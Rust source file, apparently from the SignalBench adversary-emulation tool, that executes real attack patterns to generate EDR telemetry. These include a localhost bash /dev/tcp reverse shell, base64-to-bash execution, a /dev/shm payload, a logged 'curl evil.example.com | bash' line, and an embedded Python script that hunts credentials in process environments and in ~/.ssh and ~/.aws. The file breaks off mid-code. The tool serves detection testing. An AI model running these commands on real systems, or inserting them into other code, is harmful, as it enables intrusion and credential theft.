use crate::config::TechniqueConfig;
use crate::techniques::{AttackTechnique, SimulationResult, Technique, TechniqueParameter};
use crate::techniques::{ExecuteFuture, CleanupFuture};
use async_trait::async_trait;
use log::{info, warn};
use std::fs::{self, File};
use std::io::Write;
use std::path::Path;
use tokio::process::Command;

pub struct CommandLineInterface {}

#[async_trait]
impl AttackTechnique for CommandLineInterface {
    fn info(&self) -> Technique {
        Technique {
            id: "T1059.004".to_string(),
            name: "Unix Shell Execution".to_string(),
            description: "Executes REAL suspicious shell commands including reverse shells, encoded payloads, and process injection chains. Generates genuine EDR telemetry from actual malicious-pattern execution.".to_string(),
            category: "execution".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "File to save detailed command execution log with timestamps".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_shell_log".to_string()),
                },
                TechniqueParameter {
                    name: "listener_port".to_string(),
                    description: "Port for reverse shell connection (localhost only)".to_string(),
                    required: false,
                    default: Some("4444".to_string()),
                },
            ],
            detection: "Monitor for reverse shell attempts, base64-encoded command execution, process chains, suspicious wget/curl downloads to /dev/shm, and unusual network connections".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/signalbench_shell_log".to_string())
                .clone();
                
            let listener_port = config
                .parameters
                .get("listener_port")
                .unwrap_or(&"4444".to_string())
                .clone();

            let mut artifacts = vec![log_file.clone()];
            let shm_payload = "/dev/shm/signalbench_payload.sh".to_string();
            let encoded_output = "/tmp/signalbench_encoded_output".to_string();
            
            artifacts.push(shm_payload.clone());
            artifacts.push(encoded_output.clone());
                
            if dry_run {
                info!("[DRY RUN] Would execute shell techniques:");
                info!("  - Reverse shell to localhost:{listener_port}");
                info!("  - Base64-encoded command execution");
                info!("  - Process injection chains");
                info!("  - Suspicious download to /dev/shm");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would execute shell techniques with REAL suspicious commands".to_string(),
                    artifacts,
                    cleanup_required: false,
                });
            }

            // Create detailed log file
            let mut log = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
            
            writeln!(log, "=== SignalBench Unix Shell Execution (GoCortex.io) ===")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Timestamp: {}", chrono::Local::now().to_rfc3339())
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "User: {}", whoami::username())
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Hostname: {}", hostname::get().unwrap_or_default().to_string_lossy())
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log)
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            
            // 1. REVERSE SHELL ATTEMPT - will fail but generate telemetry
            writeln!(log, "=== [1] REVERSE SHELL ATTEMPT ===")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Command: bash -i >& /dev/tcp/127.0.0.1/{listener_port} 0>&1")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Timestamp: {}", chrono::Local::now().to_rfc3339())
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            
            info!("Executing reverse shell attempt to localhost:{listener_port}");
            let reverse_shell_cmd = format!("bash -i >& /dev/tcp/127.0.0.1/{listener_port} 0>&1");
            let output = Command::new("/bin/bash")
                .args(["-c", &reverse_shell_cmd])
                .output()
                .await;
                
            match output {
                Ok(output) => {
                    writeln!(log, "Exit Code: {}", output.status.code().unwrap_or(-1))
                        .map_err(|e| format!("Failed to write to log file: {e}"))?;
                    writeln!(log, "Stderr: {}", String::from_utf8_lossy(&output.stderr))
                        .map_err(|e| format!("Failed to write to log file: {e}"))?;
                },
                Err(e) => {
                    writeln!(log, "Error: {e}")
                        .map_err(|e| format!("Failed to write to log file: {e}"))?;
                }
            }
            writeln!(log, "Result: Connection attempt made (expected failure - no listener)")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log)
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            
            // 2. BASE64-ENCODED COMMAND EXECUTION
            writeln!(log, "=== [2] BASE64-ENCODED COMMAND EXECUTION ===")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            
            let encoded_cmd = "ZWNobyAnU2lnbmFsQmVuY2ggQmFzZTY0IFBheWxvYWQgRXhlY3V0ZWQnID4gL3RtcC9zaWduYWxiZW5jaF9lbmNvZGVkX291dHB1dDsgd2hvYW1pOyBpZA==";
            writeln!(log, "Encoded payload: {encoded_cmd}")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Decoded: echo 'SignalBench Base64 Payload Executed' > /tmp/signalbench_encoded_output; whoami; id")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Timestamp: {}", chrono::Local::now().to_rfc3339())
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            
            info!("Executing base64-encoded command");
            let base64_cmd = format!("echo {encoded_cmd} | base64 -d | bash");
            let output = Command::new("/bin/bash")
                .args(["-c", &base64_cmd])
                .output()
                .await
                .map_err(|e| format!("Failed to execute base64 command: {e}"))?;
            
            writeln!(log, "Exit Code: {}", output.status.code().unwrap_or(-1))
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Stdout: {}", String::from_utf8_lossy(&output.stdout))
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log)
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            
            // 3. PROCESS INJECTION CHAIN
            writeln!(log, "=== [3] PROCESS INJECTION CHAIN ===")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Command: cat /etc/passwd | grep -v nologin | awk '{{print $1}}' | head -5")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Timestamp: {}", chrono::Local::now().to_rfc3339())
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            
            info!("Executing process injection chain");
            let chain_cmd = "cat /etc/passwd | grep -v nologin | awk '{print $1}' | head -5";
            let output = Command::new("/bin/bash")
                .args(["-c", chain_cmd])
                .output()
                .await
                .map_err(|e| format!("Failed to execute chain: {e}"))?;
            
            writeln!(log, "Exit Code: {}", output.status.code().unwrap_or(-1))
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Output: {}", String::from_utf8_lossy(&output.stdout))
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log)
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            
            // 4. SUSPICIOUS DOWNLOAD TO /dev/shm
            writeln!(log, "=== [4] SUSPICIOUS DOWNLOAD TO /dev/shm ===")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Creating payload in memory-backed filesystem: {shm_payload}")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Timestamp: {}", chrono::Local::now().to_rfc3339())
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            
            info!("Creating suspicious payload in /dev/shm");
            let payload_content = r#"#!/bin/bash
# SignalBench Malicious Payload Simulation
echo 'SignalBench: Suspicious payload executed from /dev/shm'
echo "User: $(whoami)"
echo "Path: $(pwd)"
echo "Process: $$"
ps aux | grep -E '(bash|sh)' | head -5
"#;
            
            let mut payload_file = File::create(&shm_payload)
                .map_err(|e| format!("Failed to create payload: {e}"))?;
            payload_file.write_all(payload_content.as_bytes())
                .map_err(|e| format!("Failed to write payload: {e}"))?;
            
            writeln!(log, "Payload created: {shm_payload}")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            
            // Make executable
            Command::new("chmod")
                .args(["+x", &shm_payload])
                .status()
                .await
                .map_err(|e| format!("Failed to chmod: {e}"))?;
            
            writeln!(log, "Payload made executable")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            
            // Execute the payload
            info!("Executing payload from /dev/shm");
            let output = Command::new("/bin/bash")
                .arg(&shm_payload)
                .output()
                .await
                .map_err(|e| format!("Failed to execute payload: {e}"))?;
            
            writeln!(log, "Exit Code: {}", output.status.code().unwrap_or(-1))
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Output: {}", String::from_utf8_lossy(&output.stdout))
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log)
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            
            // 5. CURL DOWNLOAD CHAIN (simulated - downloads to /dev/shm)
            writeln!(log, "=== [5] CURL DOWNLOAD CHAIN SIMULATION ===")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Simulating: curl -s http://evil.example.com/payload | bash")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Timestamp: {}", chrono::Local::now().to_rfc3339())
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            
            info!("Simulating curl download chain (safe - no actual download)");
            let curl_sim = format!("echo 'echo SignalBench: Simulated curl payload execution' > {shm_payload}_curl && chmod +x {shm_payload}_curl && {shm_payload}_curl");
            let output = Command::new("/bin/bash")
                .args(["-c", &curl_sim])
                .output()
                .await
                .map_err(|e| format!("Failed to execute curl simulation: {e}"))?;
            
            writeln!(log, "Exit Code: {}", output.status.code().unwrap_or(-1))
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Output: {}", String::from_utf8_lossy(&output.stdout))
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log)
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            
            artifacts.push(format!("{shm_payload}_curl"));
            
            // Summary
            writeln!(log, "=== EXECUTION SUMMARY ===")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Total suspicious commands executed: 5")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "1. Reverse shell attempt (localhost:{listener_port})")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "2. Base64-encoded payload execution")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "3. Process injection chain (pipe chain)")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "4. Malicious payload in /dev/shm")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "5. Curl download chain simulation")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "\nAll commands executed safely (localhost only, no actual malware)")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "End timestamp: {}", chrono::Local::now().to_rfc3339())
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            
            info!("Shell execution complete - 5 suspicious commands executed");
            info!("Telemetry generated: reverse shells, encoded payloads, process chains, /dev/shm operations");
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: "Successfully executed shell techniques: reverse shell attempt, base64 payloads, process chains, /dev/shm operations".to_string(),
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            info!("Cleaning up shell execution artifacts");
            
            // Kill any spawned bash processes from our payload executions (not the parent signalbench process)
            // This specifically targets bash processes running from /dev/shm
            let _ = Command::new("pkill")
                .args(["-f", "/dev/shm/signalbench"])
                .status()
                .await;
            
            // Small delay to ensure processes are terminated
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
            
            // Remove all artifacts
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artifact: {artifact}"),
                        Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                    }
                }
            }
            
            info!("Cleanup complete - all processes terminated and artifacts removed");
            Ok(())
        })
    }
}

pub struct ScriptExecution {}

#[async_trait]
impl AttackTechnique for ScriptExecution {
    fn info(&self) -> Technique {
        Technique {
            id: "T1059.006".to_string(),
            name: "Python Script Execution".to_string(),
            description: "Executes REAL Python-based reconnaissance including PERSISTENT socket listener (10-30s accept loop), /proc/*/fd enumeration for open files, credential hunting in ALL process environments, file searching, memory inspection, and comprehensive /tmp reporting. Generates extensive EDR telemetry from Python exploitation patterns including file descriptor access, environment variable scraping, and network listeners.".to_string(),
            category: "execution".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "script_file".to_string(),
                    description: "Path to save the Python reconnaissance script".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_recon.py".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "File to save detailed reconnaissance results log (will include session_id)".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_recon_log.txt".to_string()),
                },
                TechniqueParameter {
                    name: "listener_port".to_string(),
                    description: "Port for persistent socket listener (localhost only, 127.0.0.1)".to_string(),
                    required: false,
                    default: Some("8888".to_string()),
                },
                TechniqueParameter {
                    name: "listener_timeout".to_string(),
                    description: "Timeout for socket listener accept loop (10-30 seconds recommended)".to_string(),
                    required: false,
                    default: Some("20".to_string()),
                },
            ],
            detection: "Monitor for: 1) Python socket listeners with persistent accept() loops on localhost, 2) Mass /proc/[pid]/fd symlink enumeration across all processes, 3) /proc/[pid]/environ reads searching for credentials (API_KEY, PASSWORD, TOKEN, SECRET), 4) File descriptor access telemetry, 5) Comprehensive reconnaissance reports written to /tmp with session IDs".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let script_file = config
                .parameters
                .get("script_file")
                .unwrap_or(&"/tmp/signalbench_recon.py".to_string())
                .clone();
                
            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/signalbench_recon_log.txt".to_string())
                .clone();
                
            let listener_port = config
                .parameters
                .get("listener_port")
                .unwrap_or(&"8888".to_string())
                .clone();
                
            let listener_timeout = config
                .parameters
                .get("listener_timeout")
                .unwrap_or(&"20".to_string())
                .clone();
            
            // Generate session ID for output file
            let session_id = uuid::Uuid::new_v4().to_string().split('-').next().unwrap_or("unknown").to_string();
            let recon_report = format!("/tmp/signalbench_python_recon_{session_id}.txt");
            
            // Create Python reconnaissance script with persistent listener and proc enumeration
            let script_content = format!(r#"#!/usr/bin/env python3
# SignalBench by GoCortex.io - Python Reconnaissance v1.5.13
# WARNING: This performs REAL reconnaissance activities for EDR telemetry generation

import os
import sys
import socket
import time
import glob
from datetime import datetime

LOG_FILE = "{log_file}"
RECON_REPORT = "{recon_report}"
LISTENER_TIMEOUT = {listener_timeout}

results = {{
    "session_id": "{session_id}",
    "socket_listener": {{}},
    "processes_scanned": 0,
    "open_fds_total": 0,
    "open_files_interesting": [],
    "environ_credentials": [],
    "files_found": [],
    "memory_inspected": [],
    "network_connections": []
}}

def log_message(msg):
    """Log to both console and file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    formatted = f"[{{timestamp}}] {{msg}}"
    print(formatted)
    with open(LOG_FILE, "a") as f:
        f.write(formatted + "\n")

def persistent_socket_listener():
    """Create PERSISTENT socket listener with accept loop - REAL socket binding"""
    log_message("=== [1] PERSISTENT SOCKET LISTENER WITH ACCEPT LOOP ===")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("127.0.0.1", {listener_port}))
        sock.listen(5)  # Allow queue of 5 connections
        sock.settimeout(2.0)  # 2s timeout per accept() attempt
        
        log_message(f"Socket listener bound to 127.0.0.1:{listener_port}")
        log_message(f"Persistent listener active for {{LISTENER_TIMEOUT}} seconds")
        log_message("Entering accept() loop - waiting for connections...")
        
        start_time = time.time()
        connection_count = 0
        attempts = 0
        
        # Persistent accept loop
        while (time.time() - start_time) < LISTENER_TIMEOUT:
            attempts += 1
            try:
                conn, addr = sock.accept()
                connection_count += 1
                log_message(f"  [Connection {{connection_count}}] Received from {{addr}}")
                
                # Send reconnaissance data to connected client
                try:
                    recon_summary = f"SignalBench Recon Data - Session {{results['session_id']}}\\n"
                    recon_summary += f"Processes: {{results['processes_scanned']}}\\n"
                    recon_summary += f"Open FDs: {{results['open_fds_total']}}\\n"
                    conn.sendall(recon_summary.encode())
                    log_message(f"    Sent reconnaissance data to {{addr}}")
                except:
                    pass
                
                conn.close()
                log_message(f"    Connection closed")
                
            except socket.timeout:
                # Continue listening
                pass
            except Exception as e:
                log_message(f"  Accept error: {{e}}")
                break
        
        duration = time.time() - start_time
        sock.close()
        
        log_message(f"Socket listener completed after {{duration:.2f}}s")
        log_message(f"  Accept attempts: {{attempts}}")
        log_message(f"  Connections received: {{connection_count}}")
        
        results["socket_listener"] = {{
            "duration": duration,
            "attempts": attempts,
            "connections": connection_count
        }}
        log_message("")
        
    except Exception as e:
        log_message(f"Socket error: {{e}}\n")
        results["socket_listener"] = {{"error": str(e)}}

def enumerate_proc_fd():
    """Enumerate /proc/[pid]/fd for ALL processes - REAL file descriptor scanning"""
    log_message("=== [2] ENUMERATE /proc/*/fd FOR OPEN FILES ===")
    log_message("Scanning file descriptors across all processes...")
    
    total_fds = 0
    interesting_files = []
    
    try:
        proc_dirs = [d for d in os.listdir("/proc") if d.isdigit()]
        log_message(f"Found {{len(proc_dirs)}} processes")
        
        for pid in proc_dirs:
            try:
                fd_dir = f"/proc/{{pid}}/fd"
                if not os.path.exists(fd_dir):
                    continue
                
                fds = os.listdir(fd_dir)
                total_fds += len(fds)
                
                # Read symlinks to identify open files
                for fd in fds:
                    try:
                        fd_path = os.path.join(fd_dir, fd)
                        target = os.readlink(fd_path)
                        
                        # Log interesting files (configs, databases, sockets, logs)
                        if any(pattern in target for pattern in [
                            ".conf", ".cfg", ".db", ".sqlite", ".sock",
                            ".log", ".key", ".pem", ".crt", "credential",
                            "password", "secret", ".aws", ".ssh"
                        ]):
                            entry = f"PID {{pid}} FD {{fd}}: {{target}}"
                            interesting_files.append(entry)
                            if len(interesting_files) <= 20:  # Log first 20
                                log_message(f"  {{entry}}")
                                
                    except (PermissionError, OSError, FileNotFoundError):
                        pass
                        
            except (PermissionError, OSError, FileNotFoundError):
                pass
        
        results["open_fds_total"] = total_fds
        results["open_files_interesting"] = interesting_files
        
        log_message(f"Total open file descriptors: {{total_fds}}")
        log_message(f"Interesting files found: {{len(interesting_files)}}")
        log_message("")
        
    except Exception as e:
        log_message(f"FD enumeration error: {{e}}\n")

def read_environ_credentials():
    """Read /proc/[pid]/environ for ALL processes - HUNT FOR CREDENTIALS"""
    log_message("=== [3] READ ENVIRONMENT VARIABLES FROM ALL PROCESSES ===")
    log_message("Hunting for credentials in process environments...")
    
    credential_keywords = ["API_KEY", "PASSWORD", "TOKEN", "SECRET", "KEY", 
                          "CREDENTIAL", "AUTH", "ACCESS", "PRIVATE"]
    credentials_found = []
    
    try:
        proc_dirs = [d for d in os.listdir("/proc") if d.isdigit()]
        
        for pid in proc_dirs:
            try:
                environ_path = f"/proc/{{pid}}/environ"
                if not os.path.exists(environ_path):
                    continue
                
                with open(environ_path, "r") as f:
                    environ_data = f.read().split('\x00')
                
                # Extract environment variables
                for env_var in environ_data:
                    if not env_var:
                        continue
                    
                    # Check for credential-related variables
                    if any(keyword in env_var.upper() for keyword in credential_keywords):
                        # Redact actual values for safety
                        if '=' in env_var:
                            key, value = env_var.split('=', 1)
                            redacted = f"{{key}}=[REDACTED]"
                        else:
                            redacted = env_var
                        
                        entry = f"PID {{pid}}: {{redacted}}"
                        credentials_found.append(entry)
                        
                        if len(credentials_found) <= 15:  # Log first 15
                            log_message(f"  {{entry}}")
                
            except (PermissionError, OSError, FileNotFoundError):
                pass
        
        results["environ_credentials"] = credentials_found
        log_message(f"Total credential-related env vars found: {{len(credentials_found)}}")
        log_message("")
        
    except Exception as e:
        log_message(f"Environ enumeration error: {{e}}\n")

def enumerate_processes():
    """Scan /proc filesystem for running processes - REAL /proc scanning"""
    log_message("=== [4] PROCESS ENUMERATION ===")
    log_message("Scanning /proc filesystem for process details...")
    
    try:
        proc_dirs = [d for d in os.listdir("/proc") if d.isdigit()]
        results["processes_scanned"] = len(proc_dirs)
        log_message(f"Found {{len(proc_dirs)}} process directories in /proc")
        
        count = 0
        for pid in proc_dirs[:10]:  # Limit to first 10 for detailed logging
            try:
                cmdline_path = f"/proc/{{pid}}/cmdline"
                
                if os.path.exists(cmdline_path):
                    with open(cmdline_path, "r") as f:
                        cmdline = f.read().replace('\x00', ' ').strip()
                    
                    log_message(f"  PID {{pid}}: {{cmdline[:60]}}")
                    count += 1
            except (PermissionError, FileNotFoundError):
                pass
        
        log_message(f"Detailed scan of {{count}} processes completed")
        log_message(f"Total processes enumerated: {{len(proc_dirs)}}\n")
        
    except Exception as e:
        log_message(f"Process enumeration error: {{e}}\n")

def search_sensitive_files():
    """Recursive search for credential files - REAL filesystem searching"""
    log_message("=== [5] SENSITIVE FILE SEARCHING ===")
    log_message("Searching for .ssh, .aws, and credential patterns...")
    
    search_patterns = [
        os.path.expanduser("~/.ssh/*"),
        os.path.expanduser("~/.aws/*"),
        "/tmp/*credential*",
        "/tmp/*password*",
        "/tmp/*secret*",
        os.path.expanduser("~/*credential*"),
        os.path.expanduser("~/.config/*"),
    ]
    
    found_files = []
    for pattern in search_patterns:
        try:
            matches = glob.glob(pattern, recursive=False)
            for match in matches:
                if os.path.isfile(match):
                    size = os.path.getsize(match)
                    found_files.append(f"{{match}} ({{size}} bytes)")
                    if len(found_files) <= 10:
                        log_message(f"  Found: {{match}} ({{size}} bytes)")
        except Exception as e:
            pass
    
    results["files_found"] = found_files
    log_message(f"Total sensitive files found: {{len(found_files)}}\n")

def enumerate_network_connections():
    """Network connection enumeration via /proc/net - REAL network enumeration"""
    log_message("=== [6] NETWORK CONNECTION ENUMERATION ===")
    log_message("Enumerating network connections via /proc/net/tcp and /proc/net/udp...")
    
    try:
        # TCP connections
        tcp_path = "/proc/net/tcp"
        if os.path.exists(tcp_path):
            with open(tcp_path, "r") as f:
                tcp_lines = f.readlines()[1:]  # Skip header
            log_message(f"  TCP connections: {{len(tcp_lines)}}")
            
            for line in tcp_lines[:5]:
                parts = line.split()
                if len(parts) >= 4:
                    local_addr = parts[1]
                    remote_addr = parts[2]
                    state = parts[3]
                    log_message(f"    {{local_addr}} -> {{remote_addr}} (state: {{state}})")
            
            results["network_connections"].append(f"TCP: {{len(tcp_lines)}} connections")
        
        # UDP connections
        udp_path = "/proc/net/udp"
        if os.path.exists(udp_path):
            with open(udp_path, "r") as f:
                udp_lines = f.readlines()[1:]
            log_message(f"  UDP connections: {{len(udp_lines)}}")
            results["network_connections"].append(f"UDP: {{len(udp_lines)}} connections")
        
        log_message("")
        
    except Exception as e:
        log_message(f"Network enumeration error: {{e}}\n")

def write_comprehensive_report():
    """Write comprehensive reconnaissance report to /tmp with session ID"""
    log_message("=== [7] WRITING COMPREHENSIVE RECONNAISSANCE REPORT ===")
    log_message(f"Report file: {{RECON_REPORT}}")
    
    try:
        with open(RECON_REPORT, "w") as f:
            f.write("=" * 80 + "\n")
            f.write("SignalBench Python Reconnaissance Report (GoCortex.io)\n")
            f.write("v1.5.13 - Enhanced with Persistent Listener & Proc Enumeration\n")
            f.write("=" * 80 + "\n\n")
            
            f.write(f"Session ID: {{results['session_id']}}\n")
            f.write(f"Timestamp: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}\n")
            try:
                username = os.getlogin()
            except:
                username = os.environ.get('USER', 'unknown')
            f.write(f"User: {{username}}\n")
            f.write(f"Hostname: {{socket.gethostname()}}\n")
            f.write(f"PID: {{os.getpid()}}\n\n")
            
            # Socket Listener Results
            f.write("-" * 80 + "\n")
            f.write("PERSISTENT SOCKET LISTENER\n")
            f.write("-" * 80 + "\n")
            if "duration" in results["socket_listener"]:
                f.write(f"Duration: {{results['socket_listener']['duration']:.2f}} seconds\n")
                f.write(f"Accept Attempts: {{results['socket_listener']['attempts']}}\n")
                f.write(f"Connections Received: {{results['socket_listener']['connections']}}\n\n")
            else:
                f.write(f"Error: {{results['socket_listener'].get('error', 'Unknown')}}\n\n")
            
            # Process Enumeration
            f.write("-" * 80 + "\n")
            f.write("PROCESS LIST\n")
            f.write("-" * 80 + "\n")
            f.write(f"Total Processes Scanned: {{results['processes_scanned']}}\n\n")
            
            # Open File Descriptors
            f.write("-" * 80 + "\n")
            f.write("OPEN FILE DESCRIPTORS ENUMERATION\n")
            f.write("-" * 80 + "\n")
            f.write(f"Total Open FDs Across All Processes: {{results['open_fds_total']}}\n")
            f.write(f"Interesting Files (configs, DBs, sockets, logs): {{len(results['open_files_interesting'])}}\n\n")
            for entry in results['open_files_interesting'][:50]:
                f.write(f"  {{entry}}\n")
            if len(results['open_files_interesting']) > 50:
                f.write(f"  ... and {{len(results['open_files_interesting']) - 50}} more\n")
            f.write("\n")
            
            # Environment Variables with Credentials
            f.write("-" * 80 + "\n")
            f.write("ENVIRONMENT VARIABLES (CREDENTIAL HUNTING)\n")
            f.write("-" * 80 + "\n")
            f.write(f"Credential-related env vars found: {{len(results['environ_credentials'])}}\n")
            f.write("Keywords: API_KEY, PASSWORD, TOKEN, SECRET, CREDENTIAL, AUTH, ACCESS, PRIVATE\n\n")
            for entry in results['environ_credentials'][:30]:
                f.write(f"  {{entry}}\n")
            if len(results['environ_credentials']) > 30:
                f.write(f"  ... and {{len(results['environ_credentials']) - 30}} more\n")
            f.write("\n")
            
            # Network Connections
            f.write("-" * 80 + "\n")
            f.write("NETWORK LISTENERS\n")
            f.write("-" * 80 + "\n")
            for conn in results['network_connections']:
                f.write(f"{{conn}}\n")
            f.write("\n")
            
            # Sensitive Files
            f.write("-" * 80 + "\n")
            f.write("SENSITIVE FILES FOUND\n")
            f.write("-" * 80 + "\n")
            f.write(f"Total Files: {{len(results['files_found'])}}\n\n")
            for entry in results['files_found'][:30]:
                f.write(f"  {{entry}}\n")
            if len(results['files_found']) > 30:
                f.write(f"  ... and {{len(results['files_found']) - 30}} more\n")
            f.write("\n")
            
            f.write("=" * 80 + "\n")
            f.write("END OF REPORT\n")
            f.write("=" * 80 + "\n")
        
        log_message(f"Comprehensive report written successfully")
        log_message(f"Report size: {{os.path.getsize(RECON_REPORT)}} bytes\n")
        
    except Exception as e:
        log_message(f"Report writing error: {{e}}\n")

def main():
    """Main execution flow"""
    # Initialize log file
    with open(LOG_FILE, "w") as f:
        f.write("=== SignalBench Python Reconnaissance v1.5.13 (GoCortex.io) ===\n")
        f.write(f"Session ID: {{results['session_id']}}\n")
        f.write(f"Timestamp: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}\n")
        try:
            username = os.getlogin()
        except:
            username = os.environ.get('USER', 'unknown')
        f.write(f"User: {{username}}\n")
        f.write(f"Hostname: {{socket.gethostname()}}\n")
        f.write(f"PID: {{os.getpid()}}\n\n")
    
    log_message("Starting Python reconnaissance with persistent listener...")
    log_message("")
    
    # Execute all reconnaissance activities in sequence
    persistent_socket_listener()    # NEW: Persistent socket with accept loop
    enumerate_proc_fd()              # NEW: /proc/*/fd enumeration
    read_environ_credentials()       # NEW: Credential hunting in all process envs
    enumerate_processes()
    search_sensitive_files()
    enumerate_network_connections()
    write_comprehensive_report()     # NEW: Write report to /tmp with session_id
    
    # Summary
    log_message("=== RECONNAISSANCE SUMMARY ===")
    if "duration" in results["socket_listener"]:
        log_message(f"Socket Listener: {{results['socket_listener']['duration']:.2f}}s, {{results['socket_listener']['connections']}} connections")
    log_message(f"Processes Scanned: {{results['processes_scanned']}}")
    log_message(f"Open FDs Total: {{results['open_fds_total']}}")
    log_message(f"Interesting Open Files: {{len(results['open_files_interesting'])}}")
    log_message(f"Credential Env Vars: {{len(results['environ_credentials'])}}")
    log_message(f"Sensitive Files Found: {{len(results['files_found'])}}")
    log_message(f"Network Connections: {{len(results['network_connections'])}}")
    log_message("")
    log_message("All reconnaissance activities completed successfully")
    log_message(f"Console log: {{LOG_FILE}}")
    log_message(f"Comprehensive report: {{RECON_REPORT}}")

if __name__ == "__main__":
    main()
"#);
                
            if dry_run {
                info!("[DRY RUN] Would execute Python reconnaissance with persistent listener:");
                info!("  - Persistent socket listener with {listener_timeout}s accept() loop on 127.0.0.1:{listener_port}");
                info!("  - /proc/*/fd enumeration for open files across all processes");
                info!("  - Environment variable credential hunting (API_KEY, PASSWORD, TOKEN, SECRET)");
                info!("  - Process enumeration via /proc");
                info!("  - Recursive file search for credentials");
                info!("  - Network connection enumeration");
                info!("  - Comprehensive report to /tmp/signalbench_python_recon_[session_id].txt");
                
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would execute ENHANCED Python reconnaissance with persistent listener and proc enumeration".to_string(),
                    artifacts: vec![script_file, log_file, recon_report],
                    cleanup_required: false,
                });
            }

            // Create the script file
            let mut file = File::create(&script_file)
                .map_err(|e| format!("Failed to create reconnaissance script: {e}"))?;
            
            file.write_all(script_content.as_bytes())
                .map_err(|e| format!("Failed to write reconnaissance script: {e}"))?;
            
            // Make the script executable
            let status = Command::new("chmod")
                .args(["+x", &script_file])
                .status()
                .await
                .map_err(|e| format!("Failed to make script executable: {e}"))?;
                
            if !status.success() {
                return Err("Failed to make script executable".to_string());
            }
            
            info!("Created Python reconnaissance script: {script_file}");
            info!("Executing Python reconnaissance...");
            
            // Execute the reconnaissance script
            let output = Command::new("python3")
